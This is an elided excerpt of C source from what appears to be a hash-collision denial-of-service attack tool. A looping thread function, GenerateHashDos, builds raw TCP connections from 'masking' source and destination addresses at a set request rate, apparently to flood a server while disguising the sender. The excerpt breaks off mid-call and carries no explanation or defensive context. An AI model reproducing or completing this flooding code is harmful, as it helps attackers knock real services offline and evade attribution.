...
// session counting
uint32_t g_hash_dos_num_total;
uint32_t g_hash_dos_num_generated_in_sec;

// from main()
InputArguments g_hash_dos_input;
uint32_t g_hash_dos_request_per_sec;
...
void *GenerateHashDos(void *data)
{
    ...
    strncpy(hash_data, g_hash_dos_method, sizeof(hash_data));

    MaskingArguments hash_dos_now;
    while (1) {
        // *** begin of critical section ***
        pthread_mutex_lock(&g_hash_dos_mutex);
        // get current resource
        GetMaskingArguments(&g_hash_dos_input, &g_hash_dos_now);
        hash_dos_now = g_hash_dos_now;
        ...
        MakeTcpConnection(
                sock,    
                inet_addr(hash_dos_now.src),
                inet_addr(hash_dos_now.dest),
                &src_port,
                hash_dos_now.port,
                &seq,
                &ack,
